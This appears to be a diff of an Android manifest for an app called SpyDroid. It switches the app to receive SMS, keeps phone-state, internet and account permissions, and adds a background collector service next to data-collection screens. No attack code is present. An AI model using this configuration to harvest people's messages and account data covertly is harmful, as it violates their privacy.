@@ -5,12 +5,13 @@
       android:versionName="1.0">
 <uses-permission android:name="android.permission.READ_PHONE_STATE"></uses-permission>
 <uses-permission android:name="android.permission.INTERNET"></uses-permission>
-<uses-permission android:name="android.permission.READ_SMS"></uses-permission>
+<uses-permission android:name="android.permission.RECEIVE_SMS"></uses-permission>
 <uses-permission android:name="android.permission.GET_ACCOUNTS"></uses-permission>
+
 
     <application android:label="@string/app_name" android:icon="@drawable/ic_launcher_spydroid">
         <activity android:name=".SpyDroid"
-                  android:label="@string/app_name">
+                  android:label="@string/app_name" android:screenOrientation="portrait">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
@@ -19,6 +20,7 @@
         <activity android:label="@string/menu_pref" android:name=".view.PreferenceController"></activity>
         <activity android:name=".view.ClearDataPaneController" android:label="@string/clear_data"></activity>
         <activity android:name=".view.DataCollectionPaneController" android:label="@string/data_collection"></activity>
+        <service android:label="@string/coll_service_label" android:name="CollectorService"></service>
 
     </application>
 </manifest>
